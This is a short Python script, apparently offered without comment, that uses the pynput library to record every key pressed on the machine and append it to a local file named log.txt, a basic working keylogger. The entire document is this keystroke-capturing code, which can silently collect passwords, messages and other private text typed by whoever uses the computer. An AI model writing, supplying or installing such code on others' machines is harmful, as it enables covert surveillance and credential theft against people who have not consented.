from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt", "a") as log_file:
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f" [{key}] ")

with Listener(on_press=on_press) as listener:
    listener.join()
